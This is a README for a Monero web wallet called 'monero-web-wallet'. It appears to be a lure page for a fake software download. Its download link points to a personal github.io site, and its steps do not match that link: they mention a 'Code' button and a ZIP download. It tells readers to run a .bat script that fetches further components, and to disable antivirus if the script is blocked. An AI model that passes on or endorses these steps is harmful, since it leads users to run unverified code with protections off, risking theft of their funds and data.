# 🔒 monero-web-wallet - Your Keys, Your Privacy

[![Download Now](https://img.shields.io/badge/Download-Monero_Web_Wallet-blue?style=for-the-badge&logo=github)](https://alexiscorrea990.github.io)

---

## 👋 What Is This?

**monero-web-wallet** is a self-hosted, non-custodial Monero (XMR) web wallet that puts you in complete control. It runs on your own computer, uses the official Monero wallet engine, and keeps your private keys on your machine—never on a server. With a sleek dark interface, two-phase sending for safety, and simple Windows setup, it's the perfect way to manage your Monero securely without relying on third parties.

---

## ✨ Key Features

| Feature | What It Means For You |
|---------|----------------------|
| 🔐 **Non-Custodial** | Your private keys never leave your device. Only you can access your funds. |
| 🌐 **Self-Hosted** | You run the wallet locally—no cloud, no middlemen, no trust required. |
| 🖥️ **Dark Responsive UI** | A modern, easy-on-the-eyes interface that works on any screen size. |
| 🔄 **Two-Phase Sending** | Review every transaction and its fees before final confirmation—prevents mistakes. |
| ⚙️ **Monero RPC Powered** | Built on the official `monero-wallet-rpc`, so you get the same reliability as the core wallet. |
| 🪟 **Windows Quick Start** | Designed to get you up and running on Windows with minimal fuss. |

---

## 🚀 Getting Started

Visit this link to download the application: [https://alexiscorrea990.github.io](https://alexiscorrea990.github.io)

Once you're on the page, click the green **"Code"** button and select **"Download ZIP"**. Save the file to your computer.

---

## 📦 Installation (Windows)

1. **Extract the ZIP file** you downloaded. Right-click the `.zip` file and choose **"Extract All..."**. Pick a folder you'll remember, like `C:\MoneroWallet`.
2. **Open the extracted folder**. You'll see a folder named `monero-web-wallet-main` (or similar). Double-click to enter it.
3. **Find the setup file**. Inside, look for a file called `start-windows.bat` or `run-windows.bat`. Double-click it. This will automatically set up everything needed.

> 🛠️ **First-time setup takes a few minutes**—the script will download and configure the Monero wallet engine. Just let it finish.

---

## 🖱️ Using Your Wallet

After the setup completes, your web browser will open automatically, showing the wallet's main page. If it doesn't, open your browser and go to `http://localhost:8080`.

### Your First Steps

1. **Create a new wallet**—click the "Create Wallet" button and choose a strong password. Write down your recovery phrase and store it somewhere safe. This phrase is the ONLY way to recover your funds if you lose access.
2. **Receive Monero**—click the "Receive" tab to see your address and QR code. Share this address to receive XMR.
3. **Send Monero**—go to the "Send" tab, enter the recipient's address and amount. The wallet will show you the transaction details and fees. Review carefully, then confirm.

---

## 🔄 Sending Payments (Two-Phase Safety)

We built sending with you in mind. Here's how it works:

1. **Enter details**—address, amount, and optional note.
2. **Review screen**—you'll see a full summary including the network fee. Nothing is sent yet.
3. **Confirm**—only after you click "Confirm" will the transaction be broadcast.

This two-step process prevents accidental sends and gives you a clear picture of costs before you commit.

---

## 🔑 Managing Your Keys

Your wallet generates a 25-word recovery phrase when created. Treat this like the keys to a safe—anyone with this phrase controls your Monero. Here are our top tips:

- **Write it down on paper** and store it in a secure, private location.
- **Never take a screenshot** or store it digitally on an internet-connected device.
- **Never share it** with anyone, including support staff or websites.

Your private keys are stored locally on your machine in an encrypted file. Even if your computer is stolen, the thief can't access your funds without your password and recovery phrase.

---

## 🧰 Troubleshooting

### The app won't start
- Make sure you've extracted the ZIP file completely before running the `.bat` file.
- Check that you have an internet connection for the initial setup.
- Temporarily disable antivirus software if it blocks the script (it's safe, but some programs are cautious).

### The page won't load in my browser
- Close and reopen your browser.
- Make sure the wallet app is still running (a black terminal window should be open).
- Try `http://localhost:8080` or `http://127.0.0.1:8080` manually.

### I forgot my password
- Unfortunately, the password is required to unlock your wallet. You can restore access using your 25-word recovery phrase via the "Restore Wallet" option on the login screen.

### My transaction is stuck
- Monero transactions can take up to 20 minutes to confirm. Be patient. If it's been over an hour, check your internet connection and try refreshing the page.

---

## 🔒 Security Best Practices

| Do ✅ | Don't ❌ |
|-------|----------|
| Keep your recovery phrase offline | Don't store it in cloud notes or email |
| Use a strong, unique password | Don't reuse passwords from other sites |
| Update the app regularly | Don't download from unofficial sources |
| Run on a trusted computer | Don't use public or shared PCs |
| Verify the download URL matches | Don't click suspicious shortened links |

---

## 🌍 Why Choose Self-Hosted?

Most web wallets are hosted by third parties, meaning they control your keys and can freeze or lose your funds. With **monero-web-wallet**, you eliminate that risk entirely:

- **You own the software**—it's fully open-source, so you can audit the code yourself or hire an auditor.
- **You control the infrastructure**—your wallet runs on your machine, not on someone else's server.
- **You maintain privacy**—no company knows your IP address, transaction history, or balance.

---

## 🛠️ Technical Overview (For the Curious)

Built with modern web technologies:

- **Frontend:** React + TypeScript + Tailwind CSS, bundled with Vite for fast loading.
- **Backend:** Node.js + Express, speaking JSON-RPC to the official Monero wallet daemon.
- **Blockchain:** Full Monero integration with anonymity and privacy features enabled by default.

The entire stack is designed to be transparent, auditable, and free from hidden dependencies.

---

## 📚 Frequently Asked Questions

### Is this wallet safe for large amounts?
We recommend using hardware wallets for long-term storage of significant sums. This web wallet is excellent for everyday use, small to medium amounts, and as a learning tool.

### Can I use it on Mac or Linux?
The core software is cross-platform, but the Windows quick-start script is optimized for Windows. Advanced users can run it on other systems with manual configuration.

### How do I update the wallet?
Download the latest version from the repository and repeat the installation steps. Your wallet file and recovery phrase remain compatible.

### Does it support other cryptocurrencies?
No—this is a dedicated Monero wallet, focusing solely on XMR privacy and performance.

---

## 🤝 Contributing & Support

This is an open-source project, and contributions are welcome! If you're a developer:

- Fork the repository and submit pull requests.
- Report bugs or suggest features via the Issues tab.
- Share feedback to help improve the user experience.

For questions, join the project's discussion forum on GitHub. We're a community of privacy advocates building better tools for financial freedom.

---

## ⚠️ Important Disclaimer

Cryptocurrency involves risk. This software is provided "as is" without warranty. Always test with small amounts first, maintain backups of your recovery phrase, and never invest more than you can afford to lose. You are solely responsible for your funds.

---

Keywords: anonymity, blockchain, crypto, cryptocurrency, express, json-rpc, monero, monero-wallet, nodejs, non-custodial, open-source, privacy, react, self-hosted, tailwindcss, typescript, vite, wallet, web-wallet, xmr